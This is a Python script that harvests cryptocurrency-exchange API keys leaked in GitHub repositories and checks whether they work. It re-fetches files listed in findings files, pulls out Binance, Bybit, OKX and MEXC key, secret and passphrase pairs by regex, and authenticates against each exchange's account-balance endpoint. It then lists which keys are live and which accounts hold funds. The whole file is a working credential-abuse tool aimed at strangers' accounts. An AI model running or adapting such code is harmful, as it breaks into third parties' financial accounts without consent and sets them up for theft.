#!/usr/bin/env python3
"""
Exchange API key verifier.
Pass path to a JSONL findings file, or it scans /opt/agents/gh_findings/ by default.
Requires GH_TOKEN env var to re-fetch raw file content for key+secret extraction.
"""
import json, re, os, time, hmac, hashlib, urllib.request, urllib.error, glob, sys, base64

# Allow passing a specific file as arg, or scan the findings dir
if len(sys.argv) > 1:
    FILES = [sys.argv[1]]
    OUT = 'exchange_results.json'
else:
    FINDINGS_DIR = '/opt/agents/gh_findings'
    FILES = sorted(glob.glob(f'{FINDINGS_DIR}/*.jsonl'))
    OUT = f'{FINDINGS_DIR}/exchange_results.json'

GH_TOKEN = os.environ.get('GH_TOKEN', '')
if not GH_TOKEN:
    print('ERROR: GH_TOKEN not set', flush=True)
    sys.exit(1)

GH_HEADERS = {'Authorization': f'token {GH_TOKEN}', 'User-Agent': 'curl/7.0'}

BN_SECRET_RE  = re.compile(r'(?:BINANCE_SECRET_KEY|BINANCE_API_SECRET|binance_secret)\s*[=:\'"  ]+([A-Za-z0-9]{40,})', re.I)
BN_KEY_RE     = re.compile(r'(?:BINANCE_API_KEY|binance_api_key|binance_key)\s*[=:\'"  ]+([A-Za-z0-9]{18,64})', re.I)
BY_SECRET_RE  = re.compile(r'(?:BYBIT_API_SECRET|bybit_secret|BYBIT_SECRET)\s*[=:\'"  ]+([A-Za-z0-9]{36,})', re.I)
BY_KEY_RE     = re.compile(r'(?:BYBIT_API_KEY|bybit_api_key)\s*[=:\'"  ]+([A-Za-z0-9]{18,})', re.I)
OKX_SECRET_RE = re.compile(r'(?:OKX_SECRET_KEY|okx_secret|OKX_API_SECRET)\s*[=:\'"  ]+([A-Za-z0-9\-]{30,})', re.I)
OKX_KEY_RE    = re.compile(r'(?:OKX_API_KEY|okx_api_key)\s*[=:\'"  ]+([A-Za-z0-9\-]{28,})', re.I)
OKX_PASS_RE   = re.compile(r'(?:OKX_PASSPHRASE|OKX_API_PASSPHRASE|okx_passphrase)\s*[=:\'"  ]+([^\s\'"]{4,30})', re.I)
MX_SECRET_RE  = re.compile(r'(?:MEXC_SECRET_KEY|mexc_secret|MEXC_API_SECRET)\s*[=:\'"  ]+([A-Za-z0-9]{30,})', re.I)
MX_KEY_RE     = re.compile(r'(?:MEXC_API_KEY|mexc_api_key|MEXC_ACCESS_KEY)\s*[=:\'"  ]+([A-Za-z0-9]{20,})', re.I)

def get_raw(html_url):
    raw = html_url.replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
    try:
        req = urllib.request.Request(raw, headers=GH_HEADERS)
        r = urllib.request.urlopen(req, timeout=10)
        return r.read().decode('utf-8', errors='replace')[:12000]
    except:
        return ''

def sign256(secret, msg):
    return hmac.new(secret.encode(), msg.encode(), hashlib.sha256).hexdigest()

def binance_check(api_key, secret):
    ts = str(int(time.time() * 1000))
    qs = f'timestamp={ts}'
    sig = sign256(secret, qs)
    url = f'https://api.binance.com/api/v3/account?{qs}&signature={sig}'
    req = urllib.request.Request(url, headers={'X-MBX-APIKEY': api_key, 'User-Agent': 'curl/7.0'})
    try:
        data = json.loads(urllib.request.urlopen(req, timeout=10).read())
        bals = [b for b in data.get('balances', []) if float(b['free']) > 0 or float(b['locked']) > 0]
        return 'live', bals
    except urllib.error.HTTPError as e:
        body = e.read().decode()
        m = re.search(r'"code":(-?\d+)', body)
        c = int(m.group(1)) if m else 0
        if c in (-2015, -1002):
            return 'restricted', None
        return 'dead', None
    except Exception as e:
        return 'error', str(e)

def bybit_check(api_key, secret):
    ts = str(int(time.time() * 1000))
    rw = '5000'
    sig = sign256(secret, ts + api_key + rw)
    url = 'https://api.bybit.com/v5/account/wallet-balance?accountType=UNIFIED'
    req = urllib.request.Request(url, headers={
        'X-BAPI-API-KEY': api_key, 'X-BAPI-TIMESTAMP': ts,
        'X-BAPI-SIGN': sig, 'X-BAPI-RECV-WINDOW': rw, 'User-Agent': 'curl/7.0'
    })
    try:
        data = json.loads(urllib.request.urlopen(req, timeout=10).read())
        if data.get('retCode') == 0:
            coins = data.get('result', {}).get('list', [{}])[0].get('coin', [])
            funded = [c for c in coins if float(c.get('walletBalance', 0)) > 0]
            return 'live', funded
        return 'dead', None
    except Exception as e:
        return 'error', str(e)

def mexc_check(api_key, secret):
    ts = str(int(time.time() * 1000))
    qs = f'timestamp={ts}'
    sig = sign256(secret, qs)
    url = f'https://api.mexc.com/api/v3/account?{qs}&signature={sig}'
    req = urllib.request.Request(url, headers={'X-MEXC-APIKEY': api_key, 'User-Agent': 'curl/7.0'})
    try:
        data = json.loads(urllib.request.urlopen(req, timeout=10).read())
        bals = [b for b in data.get('balances', []) if float(b.get('free', 0)) > 0 or float(b.get('locked', 0)) > 0]
        return 'live', bals
    except Exception as e:
        return 'error', str(e)

def okx_check(api_key, secret, passphrase):
    ts = time.strftime('%Y-%m-%dT%H:%M:%S.000Z', time.gmtime())
    prehash = ts + 'GET' + '/api/v5/account/balance'
    sig = base64.b64encode(hmac.new(secret.encode(), prehash.encode(), hashlib.sha256).digest()).decode()
    url = 'https://www.okx.com/api/v5/account/balance'
    req = urllib.request.Request(url, headers={
        'OK-ACCESS-KEY': api_key, 'OK-ACCESS-SIGN': sig,
        'OK-ACCESS-TIMESTAMP': ts, 'OK-ACCESS-PASSPHRASE': passphrase,
        'User-Agent': 'curl/7.0', 'Content-Type': 'application/json'
    })
    try:
        data = json.loads(urllib.request.urlopen(req, timeout=10).read())
        if data.get('code') == '0':
            details = data.get('data', [{}])[0].get('details', [])
            funded = [d for d in details if float(d.get('cashBal', 0)) > 0]
            return 'live', funded
        return 'dead', None
    except Exception as e:
        return 'error', str(e)

# Load findings
all_findings = {}
for f in FILES:
    for line in open(f):
        try:
            e = json.loads(line)
            all_findings[e['url']] = e
        except:
            pass

print(f'Loaded {len(all_findings)} unique findings from {len(FILES)} file(s)', flush=True)

exchange_entries = []
for url, e in all_findings.items():
    for s in e.get('secrets', []):
        sl = s.lower()
        if any(x in sl for x in ['binance','bybit','okx_secret','kucoin','mexc','gate_api','kraken','huobi']):
            exchange_entries.append(e)
            break

print(f'Exchange-tagged entries: {len(exchange_entries)}\n', flush=True)

results = []
seen_keys = set()

FAKE_VALS = {'xxxxxxxx','test','example','1234','dummy','your_','replace','sample','placeholder'}

def is_fake(val):
    vl = val.lower()
    return any(f in vl for f in FAKE_VALS) or len(set(val)) < 5

for i, entry in enumerate(exchange_entries):
    url  = entry['url']
    repo = entry['repo']
    path = entry['path']

    print(f'[{i+1}/{len(exchange_entries)}] {repo}/{path}', flush=True)

    content = get_raw(url)
    time.sleep(0.25)
    if not content:
        print('  skip: fetch failed', flush=True)
        continue

    def try_pair(exchange, key_re, sec_re, check_fn, extra_re=None):
        sm = sec_re.search(content)
        km = key_re.search(content)
        if not sm or not km:
            return
        k, s = km.group(1).strip(), sm.group(1).strip()
        if is_fake(k) or is_fake(s):
            return
        pair_id = f'{exchange}:{k[:12]}'
        if pair_id in seen_keys:
            return
        seen_keys.add(pair_id)

        if extra_re:
            em = extra_re.search(content)
            if not em:
                return
            extra = em.group(1).strip()
            status, detail = check_fn(k, s, extra)
        else:
            status, detail = check_fn(k, s)

        sym = '✓' if status == 'live' else ('~' if status == 'restricted' else '✗')
        print(f'  {sym} {exchange.upper()} {status.upper()}', flush=True)
        if detail:
            print(f'    {detail[:3] if isinstance(detail, list) else detail}', flush=True)
        results.append({
            'exchange': exchange, 'status': status,
            'repo': repo, 'path': path, 'key': k,
            'detail': detail if isinstance(detail, list) else None
        })
        time.sleep(0.6)

    try_pair('binance', BN_KEY_RE,  BN_SECRET_RE,  binance_check)
    try_pair('bybit',   BY_KEY_RE,  BY_SECRET_RE,  bybit_check)
    try_pair('mexc',    MX_KEY_RE,  MX_SECRET_RE,  mexc_check)
    try_pair('okx',     OKX_KEY_RE, OKX_SECRET_RE, okx_check, OKX_PASS_RE)

print(f'\n{"="*60}', flush=True)

live       = [r for r in results if r['status'] == 'live']
restricted = [r for r in results if r['status'] == 'restricted']
funded     = [r for r in live if r.get('detail')]

print(f'Tested: {len(results)} | Live: {len(live)} | Restricted: {len(restricted)} | With funds: {len(funded)}')

if live:
    print('\n=== LIVE ===')
    for r in live:
        print(f'  {r["exchange"].upper()} | {r["repo"]}/{r["path"]}')
        for d in (r.get('detail') or [])[:8]:
            if isinstance(d, dict):
                asset = d.get('asset') or d.get('coin') or d.get('ccy','?')
                bal   = d.get('free') or d.get('walletBalance') or d.get('cashBal','?')
                print(f'    {asset}: {bal}')

if restricted:
    print('\n=== RESTRICTED (key valid, no balance read perms) ===')
    for r in restricted:
        print(f'  {r["exchange"].upper()} | {r["repo"]}/{r["path"]}')

with open(OUT, 'w') as f:
    json.dump(results, f, indent=2, default=str)
print(f'\nSaved to {OUT}')
